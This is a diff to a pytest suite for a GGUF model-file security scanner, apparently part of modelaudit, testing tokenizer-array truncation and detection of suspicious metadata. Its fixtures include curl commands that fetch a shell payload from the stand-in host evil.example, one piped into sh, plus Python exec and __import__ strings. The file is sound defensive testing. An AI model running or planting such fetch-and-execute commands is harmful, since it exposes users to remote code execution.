@@ -1,13 +1,17 @@
 """Comprehensive tests for the GGUF scanner."""
 
+import json
 import struct
 import time
+import zipfile
 from pathlib import Path
 from typing import Any
 
 import pytest
+from click.testing import CliRunner
 
 from modelaudit.cache import get_cache_manager, reset_cache_manager
+from modelaudit.cli import cli
 from modelaudit.config import ModelAuditConfig, reset_config, set_config
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.rules import Severity
@@ -19,7 +23,10 @@ from modelaudit.scanners.gguf_scanner import (
     GGUF_TENSOR_LIMIT_INCONCLUSIVE_REASON,
     GgufScanner,
 )
+from tests.cli_output import parse_click_json_output
 from tests.helpers import create_mock_gguf
+
+_RANK_262_TOKENIZER_ITEM_COUNT = 262_144
 
 
 def _write_minimal_gguf(path, n_kv=1, n_tensors=0, kv_key=b"test", kv_value=b"val"):
@@ -163,6 +170,54 @@ def _encode_gguf_string(value: str) -> bytes:
 
 def _encode_gguf_array(subtype: int, values: bytes, count: int) -> bytes:
     return struct.pack("<IQ", subtype, count) + values
+
+
+def _encode_gguf_string_array(prefix: str, count: int) -> bytes:
+    return b"".join(_encode_gguf_string(f"{prefix}-{index}") for index in range(count))
+
+
+def _encode_gguf_float32_array(count: int) -> bytes:
+    return b"".join(struct.pack("<f", float(index % 997)) for index in range(count))
+
+
+def _write_rank_262_shaped_tokenizer_gguf(path: Path) -> None:
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "tokenizer.ggml.tokens",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string_array("token", _RANK_262_TOKENIZER_ITEM_COUNT),
+                    _RANK_262_TOKENIZER_ITEM_COUNT,
+                ),
+            ),
+            (
+                "tokenizer.ggml.merges",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string_array("merge", _RANK_262_TOKENIZER_ITEM_COUNT),
+                    _RANK_262_TOKENIZER_ITEM_COUNT,
+                ),
+            ),
+            (
+                "tokenizer.ggml.scores",
+                9,
+                _encode_gguf_array(
+                    6,
+                    _encode_gguf_float32_array(_RANK_262_TOKENIZER_ITEM_COUNT),
+                    _RANK_262_TOKENIZER_ITEM_COUNT,
+                ),
+            ),
+            (
+                "tokenizer.chat_template",
+                8,
+                _encode_gguf_string("{% for message in messages %}{{ message['content'] }}{% endfor %}"),
+            ),
+        ],
+    )
 
 
 def _single_file_metadata(aggregate: Any) -> Any:
@@ -1153,6 +1208,12 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -o- https://evil.example/payload.sh | sh", "remote_fetch"),
         ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -f https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -O https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -K /tmp/curlrc https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --config /tmp/curlrc https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -fO https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -sSfK /tmp/curlrc -O https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -fsSLo /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --url https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --connect-timeout 5 https://evil.example/payload.sh", "remote_fetch"),
@@ -1241,6 +1302,11 @@ def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
         "curl --connect-timeout 'https://evil.example/payload.sh'",
         "curl -H 'https://evil.example/header'",
         "curl --header=https://evil.example/header",
+        "curl -F https://evil.example/form-field",
+        "curl --form=https://evil.example/form-field",
+        "curl -K https://evil.example/curlrc",
+        "curl --config=https://evil.example/curlrc",
+        "curl -ohttps://evil.example/output-name",
     ],
 )
 def test_gguf_metadata_curl_option_values_without_destination_stay_clean(value: str) -> None:
@@ -1249,11 +1315,36 @@ def test_gguf_metadata_curl_option_values_without_destination_stay_clean(value: 
     assert evidence == []
 
 
-@pytest.mark.parametrize("value", ["model.eval()", "module.exec('noop')", "loader.__import__('safe_name')"])
+@pytest.mark.parametrize(
+    "value",
+    [
+        "model.eval()",
+        "module.exec('noop')",
+        "loader.__import__('safe_name')",
+        "model . eval('noop')",
+        "runner . exec('noop')",
+        "loader . __import__('safe_name')",
+    ],
+)
 def test_gguf_metadata_python_attribute_methods_stay_clean(value: str) -> None:
     evidence = GgufScanner._metadata_value_security_evidence("loader", value)
 
     assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "eval('1 + 1')",
+        "exec ('print(1)')",
+        "__import__ ('os')",
+        "payload = 'print(1)'; exec(payload)",
+    ],
+)
+def test_gguf_metadata_standalone_python_execution_still_detected(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("loader", value)
+
+    assert any(item["evidence_type"] == "command_execution" for item in evidence)
 
 
 def test_gguf_metadata_value_security_evidence_handles_adversarial_punctuation_quickly() -> None:
@@ -1301,6 +1392,100 @@ def test_gguf_metadata_concrete_evidence_end_to_end_regressions(tmp_path: Path) 
     assert any(issue.rule_code == "S902" and "download" in issue.message for issue in malicious_aggregate.issues)
     assert not any(issue.rule_code == "S902" for issue in benign_aggregate.issues)
     assert determine_exit_code(benign_aggregate) == 0
+
+
+def test_gguf_metadata_curl_short_options_detected_in_directory_scan(tmp_path: Path) -> None:
+    model_dir = tmp_path / "models"
+    model_dir.mkdir()
+    create_mock_gguf(
+        model_dir / "model.gguf",
+        metadata={"download": "curl -fO https://evil.example/payload.sh"},
+    )
+
+    aggregate = scan_model_directory_or_file(str(model_dir), cache_enabled=False)
+
+    assert any(issue.rule_code == "S902" and "download" in issue.message for issue in aggregate.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_gguf_metadata_curl_short_options_detected_from_archive_cli(tmp_path: Path) -> None:
+    model_path = create_mock_gguf(
+        tmp_path / "archived.gguf",
+        metadata={"download": "curl -K /tmp/curlrc https://evil.example/payload.sh"},
+    )
+    archive_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.write(model_path, "nested/archived.gguf")
+
+    result = CliRunner().invoke(cli, ["scan", str(archive_path), "--format", "json", "--no-cache"])
+
+    assert result.exit_code == 0
+    payload = parse_click_json_output(result.output)
+    assert any(
+        issue.get("rule_code") == "S902" and "download" in issue.get("message", "") for issue in payload["issues"]
+    )
+
+
+def test_gguf_rank_262_shaped_tokenizer_metadata_arrays_are_report_truncated(tmp_path: Path) -> None:
+    path = tmp_path / "rank-262-shaped.gguf"
+    _write_rank_262_shaped_tokenizer_gguf(path)
+
+    result = GgufScanner().scan(str(path))
+    extracted = GgufScanner().extract_metadata(str(path))
+    serialized = result.to_json()
+
+    assert result.success
+    assert result.metadata["metadata_arrays_truncated"] is True
+    truncation = result.metadata["metadata_array_truncation"]
+    for key in ("tokenizer.ggml.tokens", "tokenizer.ggml.merges", "tokenizer.ggml.scores"):
+        assert truncation[key]["original_count"] == _RANK_262_TOKENIZER_ITEM_COUNT
+        assert truncation[key]["reported_count"] == GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+        assert truncation[key]["truncated_count"] == (
+            _RANK_262_TOKENIZER_ITEM_COUNT - GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+        )
+        assert len(result.metadata["metadata"][key]) == GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+    assert "token-262143" not in serialized
+    assert "merge-262143" not in serialized
+    assert len(serialized) < 1_000_000
+    assert extracted["metadata_arrays_truncated"] is True
+    assert extracted["metadata_array_truncation"]["tokenizer.ggml.tokens"]["original_count"] == (
+        _RANK_262_TOKENIZER_ITEM_COUNT
+    )
+    assert len(extracted["model_info"]["tokenizer_ggml_tokens"]) == (
+        GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+    )
+
+
+def test_gguf_rank_262_shaped_tokenizer_truncation_survives_cached_aggregate_json(tmp_path: Path) -> None:
+    path = tmp_path / "cached-rank-262-shaped.gguf"
+    cache_dir = tmp_path / "cache"
+    _write_rank_262_shaped_tokenizer_gguf(path)
+    reset_cache_manager()
+
+    first = scan_model_directory_or_file(
+        str(path),
+        cache_enabled=True,
+        cache_dir=str(cache_dir),
+        min_cache_file_size=0,
+    )
+    second = scan_model_directory_or_file(
+        str(path),
+        cache_enabled=True,
+        cache_dir=str(cache_dir),
+        min_cache_file_size=0,
+    )
+    first_metadata = _single_file_metadata(first)
+    second_metadata = _single_file_metadata(second)
+    serialized = json.dumps(second.model_dump(mode="json"), sort_keys=True)
+
+    assert first_metadata["metadata_arrays_truncated"] is True
+    assert second_metadata["metadata_arrays_truncated"] is True
+    assert second_metadata["metadata_array_truncation"] == first_metadata["metadata_array_truncation"]
+    assert len(second_metadata["metadata"]["tokenizer.ggml.tokens"]) == (
+        GgufScanner.DEFAULT_MAX_REPORTED_TOKENIZER_METADATA_ARRAY_ITEMS
+    )
+    assert "token-262143" not in serialized
+    assert len(serialized) < 1_000_000
 
 
 def test_gguf_metadata_value_check_details_are_bounded_for_giant_values(tmp_path: Path) -> None:
